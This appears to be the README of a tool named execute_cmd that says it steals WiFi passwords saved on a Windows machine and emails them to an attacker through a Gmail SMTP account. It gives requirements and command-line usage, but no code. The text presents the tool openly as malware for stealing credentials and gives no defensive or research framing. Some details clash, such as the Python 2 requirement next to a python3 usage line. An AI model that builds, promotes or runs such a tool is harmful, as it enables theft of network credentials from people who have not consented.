# execute_cmd
Simple program to steal and email WiFi passwords saved on a Windows system to an attacker.

It uses Gmail as a default SMTP Server, therefore, it requires a gmail account.

Requirements:

[+]  Python 2

[+]  Scapy 2.2 and above (pip install scapy)

Usage:

python execute_cmd.py -u [Gmail username] -p [Gmail password] -e [Email address to receive report]

python3 execute_cmd.py -u [Gmail username] -p [Gmail password] -e [Email address to receive report]
